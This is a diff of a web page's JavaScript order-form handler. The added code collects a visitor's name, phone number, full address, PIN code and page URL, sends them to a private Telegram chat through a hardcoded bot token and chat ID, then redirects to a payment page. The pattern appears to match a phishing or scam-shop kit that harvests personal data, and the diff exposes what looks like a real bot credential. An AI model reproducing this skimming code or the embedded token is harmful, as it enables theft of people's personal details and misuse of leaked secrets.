@@ -1,70 +1,44 @@
-document.addEventListener("DOMContentLoaded", function() {
-    function sendToTelegram(address) {
-      
-      const message = `New order received:\n\nName: ${address.name}\nPhone: ${address.phone}\nAddress: ${address.address}\nPIN Code: ${address.pincode}\nState: ${address.state}\nCity: ${address.city}`;
-      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-  
-      fetch(telegramUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
+
+  function submitForm() {
+    // Show loader
+    document.getElementById('loader').style.display = 'block';
+
+    // Validate form fields
+    var name = document.getElementById('name').value;
+    var phone = document.getElementById('phone').value;
+    var address = document.getElementById('address').value;
+    var pincode = document.getElementById('pincode').value;
+    var state = document.getElementById('state').value;
+    var city = document.getElementById('city').value;
+    
+    // Get current page URL
+    var currentPageUrl = window.location.href;
+
+    // Send address to Telegram bot
+    var botToken = '6752961822:AAHzDMtUeGxHpoRWenQhZJLfCbDOFJvk9Kg';
+    var chatId = '6324305321';
+    var message = "Name: " + name + "\nPhone: " + phone + "\nAddress: " + address + "\nPIN Code: " + pincode + "\nState: " + state + "\nCity: " + city + "\nPage URL: " + currentPageUrl;
+    var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+    
+    fetch(telegramUrl)
       .then(response => {
         if (!response.ok) {
           throw new Error('Failed to send message to Telegram bot');
         }
-        return response.json();
-      })
-      .then(data => {
-        console.log('Message sent successfully:', data);
+        // Delay redirect for 3 seconds
+        setTimeout(function() {
+          window.location.href = 'payment.html';
+        }, 3000);
       })
       .catch(error => {
-        console.error('Error sending message to Telegram bot:', error);
+        console.error('Error:', error);
+        // Handle error
+        alert('Failed to submit the form. Please try again later.');
+        // Hide loader
+        document.getElementById('loader').style.display = 'none';
       });
-    }
-  
-    function saveAddressToLocalStorage(address) {
-      localStorage.setItem("address", JSON.stringify(address));
-    }
-  
-    function validateForm() {
-      let name = document.getElementById("name").value;
-      let phone = document.getElementById("phone").value;
-      let address = document.getElementById("address").value;
-      let pincode = document.getElementById("pincode").value;
-      let state = document.getElementById("state").value;
-      let city = document.getElementById("city").value;
-  
-      if (name.trim() === "" || phone.trim() === "" || address.trim() === "" || pincode.trim() === "" || state.trim() === "" || city.trim() === "") {
-        alert("Please fill in all fields.");
-        return false;
-      }
-  
-      return true;
-    }
-  
-    document.querySelector("form").addEventListener("submit", function(event) {
-      event.preventDefault();
-  
-      if (validateForm()) {
-        let address = {
-          name: document.getElementById("name").value,
-          phone: document.getElementById("phone").value,
-          address: document.getElementById("address").value,
-          pincode: document.getElementById("pincode").value,
-          state: document.getElementById("state").value,
-          city: document.getElementById("city").value
-        };
-  
-        sendToTelegram(address);
-        saveAddressToLocalStorage(address);
-        window.location.href = "payment.html";
-      }
-    });
-  });
-  
+
+    // Prevent form submission
+    return false;
+  }
+
